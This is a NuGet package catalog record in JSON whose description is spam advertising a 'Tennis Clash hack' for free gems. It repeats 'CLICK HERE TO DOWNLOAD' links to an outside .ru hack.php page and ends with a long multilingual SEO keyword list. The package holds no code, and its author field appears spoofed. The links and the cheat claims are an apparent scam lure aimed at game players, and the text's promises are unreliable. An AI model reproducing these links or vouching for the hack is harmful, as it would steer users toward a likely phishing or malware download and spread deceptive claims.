{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.28.33/_tennis-clash-hack-working-2022-version-enu.7.8.75.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "349aa18c-1d6d-4c65-967c-0336835e2309",
  "catalog:commitTimeStamp": "2022-01-26T16:28:33.3283218Z",
  "created": "2022-01-26T16:26:27.277Z",
  "description": "# _Tennis Clash hack Working 2022 Version enu\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://11.bltadwin.ru/hack.php](http://11.bltadwin.ru/hack.php)\n\n\nLatest working Tennis Clash Hack and Cheats engine out for instant gems in ios android platforms. You don't need to root or jailbreak your devices. Download the Tennis Clash app on your device from Play Store or Apple Store. · Now Visit the third-party hack website. · Enter the game name in. Tennis Clash: 3D Sports Mod Apk (Hack, cracked Unlimited Coin) - Mod Hack Version An exciting for Android competitive and fun tennis.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://11.bltadwin.ru/hack.php](http://11.bltadwin.ru/hack.php)\n\n(**FREE**) tennis-clash Hack - How To Get tennis-clash Hack Latest Working. from Sat, to Sun, All Day. Tennis Clash Hack - Free of charge to take Gems Free in Tennis Clash Hack on Smartphone.  · Tennis Clash hack. Watch the video and find out as soon as possible to open everything you want in the game. This is a cool working trick that works on iOS a.\n\ntennis clash hack without verification, tennis clash hack that works, tennis clash hack reddit, tennis clash hack apk, tennis clash hack 2021, tennis clash hack mod apk, tennis clash hack tool, tennis clash hacked version, tennis clash hack apk mediafıre, tennis clash hack android, tennis clash hack android without human verification, tennis clash hack android 2020, tennis clash hack app, tennis clash hack apk 2021, tennis clash hack apk 2020, tennis clash hack apk ios, tennis clash hack brasil, tennis clash hack club, tennis clash hack cydia, tennis clash hack cheat, tennis clash coins hack, tennis clash hack ios cydia, pro100k.com tennis clash hack, cách hack tennis clash, cara hack tennis clash, tennis clash game cheats, tennis clash cheat, tennis clash unlimited coins, tennis clash hack download, tennis clash hack download ios, tennis clash hack deutsch, tennis clash hack mod apk download, does tennis clash hack work, hack de tennis clash, tennis clash hack erfahrungen, tennis clash hack español, tennis clash hack forum, tennis clash hack free, tennis clash hack for ios, tennis clash hack for iphone, hack for tennis clash, tennis clash hack funktioniert nicht, tennis clash hack game guardian, tennis clash hack gems, tennis clash hack game download, tennis clash hack generator, tennis clash hack unlimited gems, tải game tennis clash hack, hack game tennis clash ios, tennis clash hack without human verification, tennis clash hack ios no human verification, tennis clash hack jailbreak, tennis clash hack ios no jailbreak, tennis clash hacks, tennis clash cheats, tennis clash online, tennis.clash hacks, tennis clash hack mod, tennis clash hack money, tennis clash hack mod apk ios, tennis clash hack monedas infinitas, tennis clash hack no human verification, tennis clash hack no survey, tennis clash hack no verification, tennis clash hack ohne verifizierung, how to hack tennis clash on ios and get free gems 2020, tennis clash hack pc, tennis clash pro pass hack, pro100k/tennis clash hack, hack para tennis clash, hack para tennis clash 2021, tennis clash money hack, tennis clash coin hack, tennis clash hack real, reddit tennis clash hack, tennis clash hacks and cheats, hack tennis clash sin verificacion, hack tennis clash android sin verificacion, do tennis clash hacks work, can you hack tennis clash, telecharger tennis clash hack, hack tiền tennis clash, telecharger tennis clash 3d hack, hack tiên tennis clash, tải tennis clash hack, is tennis clash free, tennis clash hack version, tennis clash cheats 2020, tennis clash cheats iphone, tennis clash 1v1 hack, tennis clash hack 2020, tennis clash hack ios 2020, tennis clash 3d hack apk, tennis clash 3d hack, tennis clash setup, tennis clash upgrades, tennis clash gem hack, tennis clash gems hack",
  "id": "_Tennis-Clash-hack-Working-2022-Version-enu",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T16:28:28.53Z",
  "listed": true,
  "packageHash": "C8lBN1Zegg+kX9oO2jfZlrBsZkAnnlHJNpaFEBbIsI2pqsCX+6lFfWUz2czL5ydiepWniMxqfyy21+UQ2zikgA==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11472,
  "published": "2022-01-26T16:26:27.277Z",
  "requireLicenseAcceptance": false,
  "title": "_Tennis-Clash-hack-Working-2022-Version-enu",
  "verbatimVersion": "7.8.75",
  "version": "7.8.75",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.28.33/_tennis-clash-hack-working-2022-version-enu.7.8.75.json#xcvlkioawa.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1341,
      "fullName": "xcvlkioawa.nuspec",
      "length": 4329,
      "name": "xcvlkioawa.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.16.28.33/_tennis-clash-hack-working-2022-version-enu.7.8.75.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}